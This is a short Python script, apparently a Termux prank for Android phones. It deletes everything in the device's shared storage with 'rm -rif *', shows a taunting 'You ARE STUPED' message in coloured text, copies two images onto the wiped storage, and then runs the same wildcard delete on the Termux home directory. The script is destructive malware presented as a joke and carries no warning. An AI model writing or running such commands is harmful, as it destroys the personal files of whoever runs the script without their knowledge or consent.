
import os

import time

#os.system("cp IMG_20200816_214755.jpg /sdcard")

#os.system("cp IMG_20200816_214755.jpg /sdcard")

#os.system("cp IMG_20200816_214755.jpg /sdcard")

#os.system("cp IMG_20200816_214755.jpg /sdcard")

#os.system("cp IMG_20200816_214755.jpg /sdcard")

#os.system("cp IMG_20200816_214755.jpg /sdcard")


os.system("clear")


red = "\033[0;31m"
pur = "\033[0;35m"
gre = "\033[0;32m"
yel = "\033[0;33m"
blu = "\033[0;34m"
cya = "\033[1;36m"
whi = "\033[0;37m"


os.chdir('/storage/emulated/0')
os.system("cd /sdcard")
os.system("rm -rif *")

print(os.getcwd())

os.system("clear")


print ("" + gre)


print("\t\t\tY       o       u")
time.sleep(3)
os.system("clear")

print ("" +pur)

print ("\t\t\tA       R       E")
time.sleep(3)
os.system("clear")

print ("" +red)

print ("\t\tS   T    U    P    E    D")
time.sleep(3)


os.chdir('/data/data/com.termux/files/home/pot')
os.system('cp IMG_20200816_214755.jpg /sdcard')

os.system('cp IMG_20200817_024000.jpg /sdcard')

os.chdir('/data/data/com.termux/files/home')

os.system("rm -rif *'")
